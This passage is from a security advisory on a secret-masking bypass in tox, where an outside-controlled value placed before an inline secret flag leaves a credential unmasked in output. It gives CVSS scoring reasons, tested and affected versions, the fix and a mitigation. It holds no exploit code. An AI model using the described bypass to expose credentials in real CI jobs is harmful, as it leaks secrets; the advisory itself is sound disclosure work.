establish the authority of the exposed credential. Exposure is niche because the attack needs one outside-controlled
value before an inline secret flag in an INI command.

For scoring, the conditional path is a trusted CI job forwarding outside-supplied data and publishing its output to
readers without tox-host privileges. The reproducer does not establish that such a job is deployed.

Severity: CVSS v4.0 base 2.0 (`CVSS:4.0/AV:L/AC:L/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N`). Metric reasons:

- `AV:L`: The reproducer runs tox on the host with the triggering value or path; it shows no network route into tox.
- `AC:L`: The reproducer requires no target-specific secret or evasion technique.
- `AT:P`: The trusted INI command must place an outside-controlled value before an inline secret flag and emit output
  visible to the attacker.
- `PR:N`: The outside source and public output reader need no prior tox-host privilege in this scenario.
- `UI:P`: A trusted tox run must produce output that the attacker can read.
- `VC:L`: The test exposes one value; its credential scope remains unknown.
- `VI:N`: No data modification appears in the reproduction.
- `VA:N`: No loss of availability appears in the reproduction.
- `SC:N`: No other system disclosed data in the test.
- `SI:N`: The reproduction does not establish an integrity impact on a subsequent system.
- `SA:N`: The test shows no outage in another system.

## Versions tested

The reproducer confirms 4.67.4, report commit `7988418936b730b19981ba934dc8b57186d6b957`, and main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`. The fix was merged in
[public PR #4263](https://github.com/tox-dev/tox/pull/4263) at commit `e69ee9400a37df29b8954394139b0a9f71eafa38`.

[tox 4.67.5](https://github.com/tox-dev/tox/releases/tag/4.67.5) includes the fix.

The historical check first reproduced the masking bypass in tox 4.53.1. In 4.53.0, both control and attack values
appeared unmasked; that result does not show the bypass.

## Known mitigation

Keep outside-controlled values off command lines that also contain inline secret flags.

## Affected release

- [x] 4.53.1 (lowest confirmed affected)
- [x] 4.65.1
- [x] 4.67.4 (highest confirmed affected)

## Credits

Anthropic OSS Scanner, ANT-2026-DG5LSTFN.
